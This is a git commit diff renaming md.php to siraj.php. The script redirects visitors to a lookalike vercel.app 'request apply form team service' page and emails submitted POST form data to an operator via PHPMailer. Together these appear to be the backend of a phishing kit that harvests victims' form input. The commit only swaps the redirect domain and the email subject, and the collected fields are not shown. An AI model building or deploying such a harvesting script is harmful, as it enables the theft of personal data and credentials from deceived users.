f8378d0d84c3c2caaa70a2bb4e4fac5423b9ddb1
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-13 02:37:42 +0800

    Update and rename md.php to siraj.php

--- siraj.php
+++ siraj.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-request-issue-team-here.vercel.app/");
+header("Location: https://request-apply-form-team-service-on.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MD';
+        $mail->Subject = 'SIRAJ';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
